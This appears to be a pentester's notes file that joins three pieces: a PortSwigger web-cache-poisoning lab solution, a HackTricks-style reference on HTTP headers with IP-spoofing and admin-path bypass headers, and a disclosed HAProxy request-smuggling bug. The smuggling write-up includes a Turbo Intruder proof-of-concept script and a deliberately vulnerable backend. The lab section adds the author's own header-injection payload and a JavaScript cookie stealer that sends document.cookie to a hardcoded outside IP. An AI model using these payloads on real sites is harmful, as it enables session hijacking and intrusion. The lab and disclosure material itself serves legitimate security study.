Lab: Web cache poisoning with an unkeyed header
PRACTITIONER

##
#
https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header
#
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/special-http-headers
#
##


This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way. An unsuspecting user regularly visits the site's home page. To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser.

 Hint
ACCESS THE LAB
 Solution
With Burp running, load the website's home page
In Burp, go to "Proxy" > "HTTP history" and study the requests and responses that you generated. Find the GET request for the home page and send it to Burp Repeater.
Add a cache-buster query parameter, such as ?cb=1234.
Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request.
Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.
Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.
Go to the exploit server and change the file name to match the path used by the vulnerable response:

/resources/js/tracking.js
In the body, enter the payload alert(document.cookie) and store the exploit.
Open the GET request for the home page in Burp Repeater and remove the cache buster.
Add the following header, remembering to enter your own exploit server ID:

X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
To simulate the victim, load the poisoned URL in the browser and make sure that the alert() is triggered. Note that you have to perform this test before the cache expires. The cache on this lab expires every 30 seconds.
If the lab is still not solved, the victim did not access the page while the cache was poisoned. Keep sending the request every few seconds to re-poison the cache until the victim is affected and the lab is solved.

//
//
//


X-Forwarded-Host: 127.0.0.1"> </script> <script src="http://10.10.69.69/xx.js"></script> <!--


```
(function () {
    // Get all cookies from the document
    const cookies = document.cookie;

    // Create a new image object
    const img = new Image();

    // Hardcoded server details
    const serverIP = "10.10.169.69";
    const port = 80;

    // Set the image source to send the cookie data
    img.src = `http://${serverIP}:${port}?data=${encodeURIComponent(cookies)}`;
})();
```


Wordlists & Tools
https://github.com/danielmiessler/SecLists/tree/master/Miscellaneous/Web/http-request-headers

https://github.com/rfc-st/humble

Headers to Change Location
Rewrite IP source:


```

X-Originating-IP: 127.0.0.1

X-Forwarded-For: 127.0.0.1

X-Forwarded: 127.0.0.1

Forwarded-For: 127.0.0.1

X-Forwarded-Host: 127.0.0.1

X-Remote-IP: 127.0.0.1

X-Remote-Addr: 127.0.0.1

X-ProxyUser-Ip: 127.0.0.1

X-Original-URL: 127.0.0.1

Client-IP: 127.0.0.1

X-Client-IP: 127.0.0.1

X-Host: 127.0.0.1

True-Client-IP: 127.0.0.1

Cluster-Client-IP: 127.0.0.1

Via: 1.0 fred, 1.1 127.0.0.1
```



Connection: close, X-Forwarded-For (Check hop-by-hop headers)

Rewrite location:

X-Original-URL: /admin/console

X-Rewrite-URL: /admin/console

Hop-by-Hop headers
A hop-by-hop header is a header which is designed to be processed and consumed by the proxy currently handling the request, as opposed to an end-to-end header.

Connection: close, X-Forwarded-For

hop-by-hop headers
HTTP Request Smuggling
Content-Length: 30

Transfer-Encoding: chunked

HTTP Request Smuggling / HTTP Desync Attack
Cache Headers
Server Cache Headers:

X-Cache
 in the response may have the value 
miss
 when the request wasn't cached and the value 
hit
 when it is cached

Similar behaviour in the header 
Cf-Cache-Status

Cache-Control
 indicates if a resource is being cached and when will be the next time the resource will be cached again: Cache-Control: public, max-age=1800

Vary
 is often used in the response to indicate additional headers that are treated as part of the cache key even if they are normally unkeyed.

Age
 defines the times in seconds the object has been in the proxy cache.

Server-Timing: cdn-cache; desc=HIT
 also indicates that a resource was cached

Cache Poisoning and Cache Deception
Local Cache headers:

Clear-Site-Data: Header to indicate the cache that should be removed: Clear-Site-Data: "cache", "cookies"

Expires: Contains date/time when the response should expire: Expires: Wed, 21 Oct 2015 07:28:00 GMT

Pragma: no-cache same as Cache-Control: no-cache

Warning: The 
Warning
 general HTTP header contains information about possible problems with the status of the message. More than one Warning header may appear in a response. Warning: 110 anderson/1.3.37 "Response is stale"

Conditionals
Requests using these headers: 
If-Modified-Since
 and 
If-Unmodified-Since
 will be responded with data only if the response header**Last-Modified** contains a different time.

Conditional requests using 
If-Match
 and 
If-None-Match
 use an Etag value so the web server will send the content of the response if the data (Etag) has changed. The Etag is taken from the HTTP response.

The Etag value is usually calculated based on the content of the response. For example, ETag: W/"37-eL2g8DEyqntYlaLp5XLInBWsjWI" indicates that the Etag is the Sha1 of 37 bytes.

Range requests
Accept-Ranges
: Indicates if the server supports range requests, and if so in which unit the range can be expressed. Accept-Ranges: <range-unit>

Range
: Indicates the part of a document that the server should return.

If-Range
: Creates a conditional range request that is only fulfilled if the given etag or date matches the remote resource. Used to prevent downloading two ranges from incompatible version of the resource.

Content-Range
: Indicates where in a full body message a partial message belongs.

Message body information
Content-Length
: The size of the resource, in decimal number of bytes.

Content-Type
: Indicates the media type of the resource

Content-Encoding
: Used to specify the compression algorithm.

Content-Language
: Describes the human language(s) intended for the audience, so that it allows a user to differentiate according to the users' own preferred language.

Content-Location
: Indicates an alternate location for the returned data.

From a pentest point of view this information is usually "useless", but if the resource is protected by a 401 or 403 and you can find some way to get this info, this could be interesting.
For example a combination of 
Range
 and 
Etag
 in a HEAD request can leak the content of the page via HEAD requests:

A request with the header Range: bytes=20-20 and with a response containing ETag: W/"1-eoGvPlkaxxP4HqHv6T3PNhV9g3Y" is leaking that the SHA1 of the byte 20 is ETag: eoGvPlkaxxP4HqHv6T3PNhV9g3Y

Server Info
Server: Apache/2.4.1 (Unix)

X-Powered-By: PHP/5.3.3

Controls
Allow
: This header is used to communicate the HTTP methods a resource can handle. For example, it might be specified as Allow: GET, POST, HEAD, indicating that the resource supports these methods.

Expect
: Utilized by the client to convey expectations that the server needs to meet for the request to be processed successfully. A common use case involves the Expect: 100-continue header, which signals that the client intends to send a large data payload. The client looks for a 100 (Continue) response before proceeding with the transmission. This mechanism helps in optimizing network usage by awaiting server confirmation.

Downloads
The 
Content-Disposition
 header in HTTP responses directs whether a file should be displayed inline (within the webpage) or treated as an attachment (downloaded). For instance:

Copy
Content-Disposition: attachment; filename="filename.jpg"
This means the file named "filename.jpg" is intended to be downloaded and saved.

Security Headers
Content Security Policy (CSP)
Content Security Policy (CSP) Bypass
Trusted Types
By enforcing Trusted Types through CSP, applications can be protected against DOM XSS attacks. Trusted Types ensure that only specifically crafted objects, compliant with established security policies, can be used in dangerous web API calls, thereby securing JavaScript code by default.

Copy
// Feature detection
if (window.trustedTypes && trustedTypes.createPolicy) {
  // Name and create a policy
  const policy = trustedTypes.createPolicy('escapePolicy', {
    createHTML: str => str.replace(/\</g, '&lt;').replace(/>/g, '&gt;');
  });
}
Copy
// Assignment of raw strings is blocked, ensuring safety.
el.innerHTML = 'some string'; // Throws an exception.
const escaped = policy.createHTML('<img src=x onerror=alert(1)>');
el.innerHTML = escaped;  // Results in safe assignment.
X-Content-Type-Options
This header prevents MIME type sniffing, a practice that could lead to XSS vulnerabilities. It ensures that browsers respect the MIME types specified by the server.

Copy
X-Content-Type-Options: nosniff
X-Frame-Options
To combat clickjacking, this header restricts how documents can be embedded in <frame>, <iframe>, <embed>, or <object> tags, recommending all documents to specify their embedding permissions explicitly.

Copy
X-Frame-Options: DENY
Cross-Origin Resource Policy (CORP) and Cross-Origin Resource Sharing (CORS)
CORP is crucial for specifying which resources can be loaded by websites, mitigating cross-site leaks. CORS, on the other hand, allows for a more flexible cross-origin resource sharing mechanism, relaxing the same-origin policy under certain conditions.

Copy
Cross-Origin-Resource-Policy: same-origin
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
Cross-Origin Embedder Policy (COEP) and Cross-Origin Opener Policy (COOP)
COEP and COOP are essential for enabling cross-origin isolation, significantly reducing the risk of Spectre-like attacks. They control the loading of cross-origin resources and the interaction with cross-origin windows, respectively.

Copy
Cross-Origin-Embedder-Policy: require-corp
Cross-Origin-Opener-Policy: same-origin-allow-popups
HTTP Strict Transport Security (HSTS)
Lastly, HSTS is a security feature that forces browsers to communicate with servers only over secure HTTPS connections, thereby enhancing privacy and security.

Copy
Strict-Transport-Security: max-age=3153600
References
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Disposition

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

https://web.dev/security-headers/

https://web.dev/articles/security-headers



##
##

##
#
https://gist.github.com/ndavison/4c69a2c164b2125cd6685b7d5a3c135b
#
##


The following describes a technique to achieve HTTP request smuggling against infrastructure behind a HAProxy server when using specific configuration around backend connection reuse. This was tested against HAProxy versions 1.7.9, 1.7.11, 1.8.19, 1.8.21, 1.9.10, and 2.0.5. Of all these tested versions, only 2.0.5 was not vulnerable out of the box, although it is when using the `no option http-use-htx` configuration, which reverts back to the legacy HTTP decoder. 2.1 removed the legacy decoder so it is not affected.

To actually exploit HTTP smuggling using the issue described in this writeup, the backend server(s) behind HAProxy would  also have to be vulnerable in the sense they too would need to suffer from a bug, but one which parses and accepts a poorly formed Transfer-Encoding header (almost certainly violating RFC7230), and allows HTTP keep-alive.

## The HAProxy bug - sending both Transfer-Encoding and Content-Length

This is how HAProxy handles a request when Transfer-Encoding and Content-Length is provided together:

**Request to HAProxy:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Request forwarded to backend:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Transfer-Encoding: chunked
X-Forwarded-For: 172.21.0.1

0

```

The request HAProxy sends to the backend has correctly prioritized Transfer-Encoding, and has stripped out the content length and cut off the "X" from the request, which went outside the boundry of the Transfer-Encoding request.

However, in the next request we have a `\x0b` (vertical tab) before the "chunked" string (note: `\x0c` aka form feed also works).

**Request to HAProxy:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:[\x0b]chunked

0

X
```

**Request forwarded to backend:**
```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

0

X
```

In this case, the Transfer-Encoding is not detected by HAProxy, and so the Content-Length is used (and as such, the `X` is forwarded because it falls within the 6 bytes of body size specified). However, because the Transfer-Encoding remains in the request sent to the backend, it means that if a backend server manages to parse the Transfer-Encoding header and proceeds to treat the request as a TE encoded request, a desync could occur and the backend TCP socket could be poisoned (in this case, with an "X"). This could then lead to HTTP request smuggling. A way to test whether this might be the case on an app behind HAProxy would be to issue a request like as outlined in the [HTTP Request Smuggling Reborn](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) research:

```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 4
Transfer-Encoding:chunked

1
Z
Q
```

Because it uses the Content-Length, HAProxy will forward the following to the backend:

```http
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 4
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

1
Z
```

If the backend parses this request using Transfer-Encoding, then it will timeout waiting for the terminating '0\r\n\r\n'. The aforementioned research classifies it as "CL.TE" desync.

## Request smuggling proof of concept

Now we have HAProxy sending through both Content-Length and Transfer-Encoding with potentially conflicting information, we can try to achieve request smuggling. This can be demonstrated using the following setup.

### HAProxy config

Use this `haproxy.cfg`:

```
defaults
	mode http
  	timeout http-keep-alive 10s
	timeout connect 5s
	timeout server 60s
	timeout client 30s
	timeout http-request 30s

backend web
	http-reuse always
	server web0 host.docker.internal:6767

frontend http
	bind *:1080
	timeout client 5s
	timeout http-request 10s
  	default_backend web
```

You may need to change `host.docker.internal` to point to the actual backend app (code below), as this currently assumes HAProxy is running in a docker container and the docker host is running the backend server.

The real key here is `http-reuse always`, which is not the default option for handling connection reuse in HAProxy. See more detail about this setting here: [http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse](http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse). This is essential to achieve request smuggling, as we want our victim connections from HAProxy to the backend server to reuse our attacker controlled connection.

### The backend

For the backend, we need a HTTP server which will go along with the HAProxy keep-alives, and which will parse the malformed Transfer-Encoding header as valid, and also prioritize the Transfer-Encoding over Content-Length. This could describe many backend servers, but one I've found is the Python gunicorn app server (tested against the current latest 19.9.0) when combined with any of the workers except sync (doesn't support keep-alive) and tornado. Below I have a demo web app using Flask that should be vulnerable to request smuggling when combined with the HAProxy bug. First let's install the prereqs:

```bash
pip install flask
pip install gunicorn
pip install gunicorn[gevent]
```

And the app `backend.py`:

```python
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def main():
    # the next line is required for Transfer-Encoding support in the request
    request.environ['wsgi.input_terminated'] = True
    headers = {}
    for header in request.headers:
        headers[header[0]] = header[1]
    return jsonify(body=request.data, headers=headers)
```

gunicorn is used to serve the application, and we need to specify a non default worker to enable keep-alive:

```bash
gunicorn --keep-alive 10 -k gevent --bind 0.0.0.0:6767 -w 4 backend:app
```

Now with HAProxy running the above config and our backend server running, we should be able to test it for smuggling. The best way to do this from my experience is using Burp Suite's Turbo Intruder extension with the following script:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://127.0.0.1:1080',
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 37
Connection: keep-alive
Transfer-Encoding:chunked

1
A
0

GET / HTTP/1.1
X-Foo: bar'''
    engine.queue(attack)
    engine.start()


def handleResponse(req, interesting):
    table.add(req)
    if req.code == 200:
        victim = '''GET / HTTP/1.1
Host: 127.0.0.1:1080
Connection: close

'''

        for i in range(10):
            req.engine.queue(victim)
```

Note the `concurrentConnections=1` and `requestsPerConnection=1` configuration in this script - this should avoid encountering false positives, where we are poisoning our client to HAProxy connection instead of HAProxy to backend. You may need to change the endpoint and Host headers to suit your environment.

How do we know we have achieved smuggling? when we launch this attack in Turbo Intruder, one of the victim results (likely the first) should stand out response size wise. Going back to the above app code, we are echoing out the request headers in the response. Here is what the response for the poisoned victim request looks like:

```json
{"body":"","headers":{"Host":"127.0.0.1:1080","X-Foo":"barGET / HTTP/1.1"}}
```

We can see here that the `X-Foo: bar` header in the attacker request is present in a victim request's headers, and the `GET / HTTP/1.1` that the victim really wanted to request has been appended to this. This is a smuggled header, achieving HTTP request smuggling.

## Fix

The HAProxy bug which allows the malformed Transfer-Encoding header through was [fixed in 2.0.6](http://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581) for those on 2.0.x who need the `no option http-use-htx` config. In 1.9, you should be able to use `option http-use-htx` to switch to the new HTTP decoder which is enabled by default in 2.0, which is not vulnerable to this bug. For those on 1.9 who need to use the legacy decoder or on earlier versions, the [commit message](http://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581) suggests it will be back ported to all maintained versions (which appears to be 1.6 and above at the time or writing).

## Reporting timeline

* Reported the malformed Transfer-Encoding bug to HAProxy maintainers on September 7th 2019.
* Fixed in [HAProxy 2.0.6 on September 13th 2019](https://www.mail-archive.com/haproxy@formilux.org/msg34926.html)

## Thanks

A big thanks to [James Kettle](https://twitter.com/albinowax) for the advice, and particularly for the tip on the Turbo Intruder script and needing `requestsPerConnection=1` to avoid false positives with smuggling. Also, thanks to the HAProxy maintainers for their responsiveness and advice to help further understand the issue.
